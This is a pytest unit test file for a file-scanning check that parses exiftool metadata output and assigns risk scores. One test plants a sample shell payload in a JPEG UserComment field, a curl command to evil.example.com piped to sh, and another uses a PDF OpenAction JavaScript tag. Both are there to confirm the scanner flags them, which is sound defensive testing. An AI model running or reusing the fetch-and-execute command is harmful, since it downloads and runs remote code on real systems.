"""Unit tests for checks/exif_metadata.py's exiftool output parsing/scoring logic.

Deliberately excludes anything that shells out to the real `exiftool` binary
-- not available in the no-network pytest venv (CLAUDE.md section 6: tests
fake the seam, never the real subprocess/network), same rationale as
test_scan_pure_logic.py's clamscan/file exclusions and test_yara_scan.py's
yara exclusion. `run()` itself is exercised via a monkeypatch of
subprocess.run using JSON captured from real `exiftool -j` invocations
(Alpine 3.20, exiftool 12.80) so the applicability-gating, boilerplate-
filtering, and risk-scoring logic gets real coverage without a real binary
in this venv.
"""

from __future__ import annotations

import json
from types import SimpleNamespace

import pytest

from app.modules.x402_scan.sandbox.checks import exif_metadata

# Real `exiftool -j` output on a plain 4x4 PNG with no embedded metadata
# beyond its own IHDR-derived structural fields, captured against Alpine
# 3.20's exiftool 12.80.
_REAL_PNG_STDOUT = json.dumps(
    [
        {
            "SourceFile": "/tmp/test.png",
            "ExifToolVersion": 12.80,
            "FileName": "test.png",
            "Directory": "/tmp",
            "FileSize": "73 bytes",
            "FileModifyDate": "2026:09:01 08:14:35+00:00",
            "FileAccessDate": "2026:09:01 08:14:35+00:00",
            "FileInodeChangeDate": "2026:09:01 08:14:35+00:00",
            "FilePermissions": "-rw-r--r--",
            "FileType": "PNG",
            "FileTypeExtension": "png",
            "MIMEType": "image/png",
            "ImageWidth": 4,
            "ImageHeight": 4,
            "BitDepth": 8,
            "ColorType": "RGB",
            "Compression": "Deflate/Inflate",
            "Filter": "Adaptive",
            "Interlace": "Noninterlaced",
            "ImageSize": "4x4",
            "Megapixels": 0.000016,
        }
    ]
)

# Real output on a truncated/garbage JPEG -- FileType is still recognized,
# but exiftool surfaces its own "Warning" about malformed structure.
_REAL_MALFORMED_JPEG_STDOUT = json.dumps(
    [
        {
            "SourceFile": "/tmp/fake.jpg",
            "ExifToolVersion": 12.80,
            "FileName": "fake.jpg",
            "Directory": "/tmp",
            "FileSize": "19 bytes",
            "FileModifyDate": "2026:09:01 08:13:27+00:00",
            "FileAccessDate": "2026:09:01 08:13:27+00:00",
            "FileInodeChangeDate": "2026:09:01 08:13:27+00:00",
            "FilePermissions": "-rw-r--r--",
            "FileType": "JPEG",
            "FileTypeExtension": "jpg",
            "MIMEType": "image/jpeg",
            "Warning": "JPEG format error",
        }
    ]
)

# Real output on an unrecognized binary blob -- no FileType at all.
_REAL_UNKNOWN_FILE_STDOUT = json.dumps(
    [
        {
            "SourceFile": "/tmp/rand.bin",
            "ExifToolVersion": 12.80,
            "FileName": "rand.bin",
            "Directory": "/tmp",
            "FileSize": "2.6 kB",
            "FileModifyDate": "2026:09:01 08:15:23+00:00",
            "FileAccessDate": "2026:09:01 08:15:23+00:00",
            "FileInodeChangeDate": "2026:09:01 08:15:23+00:00",
            "FilePermissions": "-rw-r--r--",
            "Error": "Unknown file type",
        }
    ]
)


def _fake_run(stdout: str, returncode: int = 0, stderr: str = "") -> SimpleNamespace:
    return SimpleNamespace(returncode=returncode, stdout=stdout, stderr=stderr)


def test_run_benign_png_reports_fields_with_no_risk_score(monkeypatch: pytest.MonkeyPatch) -> None:
    """A normal image with unremarkable structural metadata is plain informational, no risk_score key."""
    monkeypatch.setattr(
        exif_metadata.subprocess, "run", lambda *_a, **_k: _fake_run(_REAL_PNG_STDOUT)
    )
    result = exif_metadata.run("/scan/input")
    assert result["file_type"] == "PNG"
    assert result["metadata_fields"]["ColorType"] == "RGB"
    # Boilerplate/identity fields (already covered by basic_analysis.py) are excluded.
    assert "FileName" not in result["metadata_fields"]
    assert "MIMEType" not in result["metadata_fields"]
    assert "risk_score" not in result
    assert "caution_notes" not in result


def test_run_non_applicable_file_returns_empty_dict(monkeypatch: pytest.MonkeyPatch) -> None:
    """An unrecognized binary (no FileType at all) is out of scope -- {} mirrors archive.py's convention."""
    monkeypatch.setattr(
        exif_metadata.subprocess, "run", lambda *_a, **_k: _fake_run(_REAL_UNKNOWN_FILE_STDOUT, 1)
    )
    assert exif_metadata.run("/scan/input") == {}


def test_run_malformed_recognized_file_flags_warning(monkeypatch: pytest.MonkeyPatch) -> None:
    """A recognized-but-broken JPEG surfaces exiftool's own Warning as a caution note with risk_score."""
    monkeypatch.setattr(
        exif_metadata.subprocess,
        "run",
        lambda *_a, **_k: _fake_run(_REAL_MALFORMED_JPEG_STDOUT, 1),
    )
    result = exif_metadata.run("/scan/input")
    assert result["file_type"] == "JPEG"
    assert result["risk_score"] > 0
    assert any("JPEG format error" in note for note in result["caution_notes"])


def test_run_flags_dangerous_pdf_action_tag_name(monkeypatch: pytest.MonkeyPatch) -> None:
    """A PDF exposing a known auto-executing action/script tag name is flagged with a strong risk_score."""
    stdout = json.dumps(
        [
            {
                "FileType": "PDF",
                "MIMEType": "application/pdf",
                "PDFVersion": 1.4,
                "OpenAction": "/JavaScript (app.alert('hi'))",
            }
        ]
    )
    monkeypatch.setattr(exif_metadata.subprocess, "run", lambda *_a, **_k: _fake_run(stdout))
    result = exif_metadata.run("/scan/input")
    assert result["risk_score"] >= 0.6
    assert any(
        "OpenAction" in note and "action/script key" in note for note in result["caution_notes"]
    )


def test_run_flags_script_looking_content_in_a_field_value(monkeypatch: pytest.MonkeyPatch) -> None:
    """A metadata field whose text value looks like an embedded shell/script payload is flagged."""
    stdout = json.dumps(
        [
            {
                "FileType": "JPEG",
                "MIMEType": "image/jpeg",
                "UserComment": "#!/bin/sh\ncurl http://evil.example.com/x | sh",
            }
        ]
    )
    monkeypatch.setattr(exif_metadata.subprocess, "run", lambda *_a, **_k: _fake_run(stdout))
    result = exif_metadata.run("/scan/input")
    assert result["risk_score"] > 0
    assert any("UserComment" in note for note in result["caution_notes"])


def test_run_flags_oversized_metadata_field_and_truncates_display_value(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """An anomalously large field is flagged, and the value actually embedded in the report is capped."""
    huge_value = "A" * (exif_metadata.FIELD_VALUE_OVERSIZED_THRESHOLD + 1000)
    stdout = json.dumps(
        [{"FileType": "PNG", "MIMEType": "image/png", "XMP-dc:Description": huge_value}]
    )
    monkeypatch.setattr(exif_metadata.subprocess, "run", lambda *_a, **_k: _fake_run(stdout))
    result = exif_metadata.run("/scan/input")
    assert result["risk_score"] > 0
    assert any("anomalously large" in note for note in result["caution_notes"])
    reported_value = result["metadata_fields"]["XMP-dc:Description"]
    assert len(reported_value) < len(huge_value)
    assert "truncated" in reported_value


def test_run_caps_total_number_of_reported_fields(monkeypatch: pytest.MonkeyPatch) -> None:
    """A pathological number of distinct metadata tags is capped, not left unbounded in the report."""
    many_fields = {f"CustomTag{i}": "x" for i in range(exif_metadata.MAX_FIELDS_REPORTED + 10)}
    stdout = json.dumps([{"FileType": "PNG", "MIMEType": "image/png", **many_fields}])
    monkeypatch.setattr(exif_metadata.subprocess, "run", lambda *_a, **_k: _fake_run(stdout))
    result = exif_metadata.run("/scan/input")
    assert len(result["metadata_fields"]) == exif_metadata.MAX_FIELDS_REPORTED
    assert result["fields_omitted"] == 10


def test_run_missing_binary_returns_error_not_raise(monkeypatch: pytest.MonkeyPatch) -> None:
    """`exiftool` not being installed must surface as {"error": ...}, never raise or false-report clean."""

    def fake_run(*_args: object, **_kwargs: object) -> SimpleNamespace:
        raise FileNotFoundError("exiftool: not found")

    monkeypatch.setattr(exif_metadata.subprocess, "run", fake_run)
    result = exif_metadata.run("/scan/input")
    assert "error" in result
    assert "risk_score" not in result


def test_run_unparseable_json_returns_error(monkeypatch: pytest.MonkeyPatch) -> None:
    """Non-JSON stdout (e.g. a hard exiftool failure) surfaces as {"error": ...}, never a fabricated report."""
    monkeypatch.setattr(
        exif_metadata.subprocess,
        "run",
        lambda *_a, **_k: _fake_run(
            "Error: File not found - /tmp/nope", 1, "Error: File not found"
        ),
    )
    result = exif_metadata.run("/scan/input")
    assert "error" in result
